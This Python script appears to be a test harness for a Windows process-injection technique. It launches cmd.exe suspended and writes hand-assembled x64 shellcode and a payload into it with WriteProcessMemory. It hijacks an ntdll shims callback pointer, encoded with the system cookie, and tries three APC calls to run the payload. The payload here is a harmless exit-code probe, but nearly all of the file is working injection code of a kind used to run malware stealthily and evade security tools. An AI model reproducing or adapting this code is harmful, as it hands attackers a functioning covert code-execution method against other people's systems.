# -*- coding: utf-8 -*-
"""ec_stage2_harness_v6.py - try three APC delivery variants from the EC
callback stub and record each NTSTATUS in the target scratch page:
  scratch+8  = NtQueueApcThread(-2, payload, param, 0, 0)
  scratch+16 = NtQueueApcThreadEx(-2, 0, payload, param, 0, 0)
  scratch+24 = kernel32!QueueUserAPC(payload, -2, param)
Stops at the first success (test rax/jz). Also dumps the first 16 bytes of
the resolved NtQueueApcThread to verify the syscall stub."""
import ctypes
import os
import struct
import sys
import time
from ctypes import wintypes

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from ec_stage2_harness import (scan_anchors, rol64, k32,
                               STARTUPINFOW, PROCESS_INFORMATION,
                               MEM_COMMIT, MEM_RESERVE, PAGE_RW, PAGE_ER,
                               PAGE_ERW)

STUB_SIZE = 0x100


def build_stub_v6(shims, scratch, payload, ntqapc, ntqapcex, quserapc, param):
    st = bytearray(b"\xCC" * STUB_SIZE)
    o = 0

    def imm(code, val):
        nonlocal o
        st[o:o + len(code)] = code
        st[o + len(code):o + len(code) + 8] = struct.pack("<Q", val)
        o += len(code) + 8

    def raw(code):
        nonlocal o
        st[o:o + len(code)] = code
        o += len(code)

    def imm32(code, val):
        nonlocal o
        st[o:o + len(code)] = code
        st[o + len(code):o + len(code) + 4] = struct.pack("<i", val)
        o += len(code) + 4

    imm(b"\x48\xb8", shims); raw(b"\xc6\x00\x00")            # shims = 0
    imm(b"\x48\xb8", scratch); raw(b"\xc6\x00\x4f")          # marker
    # ---- call 1: NtQueueApcThread(-2, payload, param, 0, 0)
    raw(b"\x48\x83\xec\x28")
    imm32(b"\x48\xc7\x04\x24", 0)                            # mov [rsp],0 (Arg3)
    imm32(b"\x48\xc7\xc1", -2)                               # rcx = -2
    imm(b"\x48\xba", payload)                                # rdx = payload
    imm(b"\x49\xb8", param)                                  # r8 = param
    raw(b"\x4d\x31\xc9")                                     # r9 = 0
    imm(b"\x48\xb8", ntqapc); raw(b"\xff\xd0")
    raw(b"\x48\x83\xc4\x28")
    imm(b"\x49\xb9", scratch); raw(b"\x49\x89\x41\x08")      # [scr+8] = status1
    raw(b"\x48\x85\xc0")
    raw(b"\x90\x90\x90\x90\x90\x90")     # probe: run ALL variants (no jz)
    jz1 = o  # unused now
    # ---- call 2: NtQueueApcThreadEx(-2, 0, payload, param, 0, 0)
    raw(b"\x48\x83\xec\x38")
    imm32(b"\x48\xc7\x44\x24\x20", 0)                        # Arg3
    imm32(b"\x48\xc7\x44\x24\x28", 0)                        # Arg4... (6-arg home)
    imm32(b"\x48\xc7\xc1", -2)                               # rcx = thread
    raw(b"\x48\x31\xd2")                                     # rdx = 0 (reserve)
    imm(b"\x49\xb8", payload)                                # r8 = apc routine
    imm(b"\x49\xb9", param)                                  # r9 = arg1
    imm(b"\x48\xb8", ntqapcex); raw(b"\xff\xd0")
    raw(b"\x48\x83\xc4\x38")
    imm(b"\x49\xb9", scratch); raw(b"\x49\x89\x41\x10")      # [scr+16] = status2
    raw(b"\x48\x85\xc0")
    raw(b"\x90\x90\x90\x90\x90\x90")     # probe: no jz
    jz2 = o
    # ---- call 3: QueueUserAPC(payload, -2, param)
    raw(b"\x48\x83\xec\x28")
    imm(b"\x48\xb9", payload)                                # rcx = pfnAPC
    imm32(b"\x48\xc7\xc2", -2)                               # rdx = -2
    imm(b"\x49\xb8", param)                                  # r8 = dwData
    imm(b"\x48\xb8", quserapc); raw(b"\xff\xd0")
    raw(b"\x48\x83\xc4\x28")
    imm(b"\x49\xb9", scratch); raw(b"\x49\x89\x41\x18")      # [scr+24] = status3
    raw(b"\x48\x85\xc0")
    raw(b"\x90\x90\x90\x90\x90\x90")     # probe: no jz
    done = o
    raw(b"\xc3")
    return bytes(st), o


def probe_exitprocess():
    h = k32.GetModuleHandleW("kernel32.dll")
    ep = k32.GetProcAddress(h, b"ExitProcess")
    # spin ~5s so the parent can read the status words before exit
    spin = (b"\x48\xb8" + struct.pack("<Q", 0x140000000)
            + b"\x48\xff\xc8"
            + b"\x75\xfb")                                 # mov rax,N; dec; jnz
    return (b"\x48\x83\xec\x28" + spin
            + b"\xb9\x37\x13\x00\x00"
            + b"\x48\xb8" + struct.pack("<Q", ep) + b"\xff\xd0")


def main():
    hits = scan_anchors()
    nt_base = k32.GetModuleHandleW("ntdll.dll")
    shims = nt_base + hits["shims"]
    pfn = nt_base + hits["pfn"]
    ntq = k32.GetProcAddress(nt_base, b"NtQueueApcThread")
    ntqe = k32.GetProcAddress(nt_base, b"NtQueueApcThreadEx")
    k32base = k32.GetModuleHandleW("kernel32.dll")
    quapc = k32.GetProcAddress(k32base, b"QueueUserAPC")
    print("ntq=0x%x ntqe=0x%x quapc=0x%x" % (ntq, ntqe, quapc))
    # dump first 16 bytes of NtQueueApcThread (verify mov r10/rcx+eax pattern)
    rd = (ctypes.c_char * 16)()
    got = ctypes.c_size_t(0)
    hself = k32.GetCurrentProcess()
    k32.ReadProcessMemory(hself, ctypes.c_void_p(ntq), rd, 16, ctypes.byref(got))
    print("ntq bytes:", rd.raw.hex())

    cookie = ctypes.c_uint32.from_address(0x7FFE0330).value
    si = STARTUPINFOW(); si.cb = ctypes.sizeof(si)
    pi = PROCESS_INFORMATION()
    target_exe = os.path.join(os.environ["SystemRoot"], "System32", "cmd.exe")
    cmd = ctypes.create_unicode_buffer('"%s" /c ping -n 30 127.0.0.1 >nul' % target_exe)
    if not k32.CreateProcessW(None, cmd, None, None, False, 0x4 | 0x08000000,
                              None, None, ctypes.byref(si), ctypes.byref(pi)):
        print("CreateProcessW failed", k32.GetLastError()); return 2
    hp, ht, tpid = pi.hProcess, pi.hThread, pi.dwProcessId
    stub_va = k32.VirtualAllocEx(hp, None, STUB_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_RW)
    pay_va = k32.VirtualAllocEx(hp, None, 0x100, MEM_COMMIT | MEM_RESERVE, PAGE_ERW)
    scr_va = k32.VirtualAllocEx(hp, None, 0x100, MEM_COMMIT | MEM_RESERVE, PAGE_RW)
    payload = probe_exitprocess()
    stub, slen = build_stub_v6(shims, scr_va, pay_va, ntq, ntqe, quapc, 0)
    ok = k32.WriteProcessMemory(hp, ctypes.c_void_p(stub_va), stub, slen, ctypes.byref(got))
    ok &= k32.WriteProcessMemory(hp, ctypes.c_void_p(pay_va), payload, len(payload), ctypes.byref(got))
    old = wintypes.DWORD(0)
    k32.VirtualProtectEx(hp, ctypes.c_void_p(stub_va), STUB_SIZE, PAGE_ER, ctypes.byref(old))
    k32.WriteProcessMemory(hp, ctypes.c_void_p(shims), b"\x01", 1, ctypes.byref(got))
    enc = rol64(stub_va ^ cookie, 64 - (cookie & 63))
    k32.WriteProcessMemory(hp, ctypes.c_void_p(pfn), struct.pack("<Q", enc), 8, ctypes.byref(got))
    print("pid=%d armed writes=%s" % (tpid, bool(ok)))
    k32.ResumeThread(ht)

    t0 = time.time()
    while time.time() - t0 < 15:
        buf = (ctypes.c_char * 32)()
        k32.ReadProcessMemory(hp, ctypes.c_void_p(scr_va), buf, 32, ctypes.byref(got))
        if buf.raw[:1] == b"O":
            s1, s2, s3 = struct.unpack_from("<III", buf.raw, 8)
            print("t+%.1fs statuses: qapc=0x%08x ex=0x%08x quserapc=0x%08x"
                  % (time.time() - t0, s1, s2, s3))
            break
        time.sleep(0.5)
    code = wintypes.DWORD()
    time.sleep(4)
    k32.GetExitCodeProcess(hp, ctypes.byref(code))
    print("final exit=0x%x verdict=%s" %
          (code.value, "PASS" if code.value == 0x1337 else "NO-PAYLOAD"))
    if code.value == 259:
        k32.TerminateProcess(hp, 1)
    k32.CloseHandle(ht); k32.CloseHandle(hp)


if __name__ == "__main__":
    main()
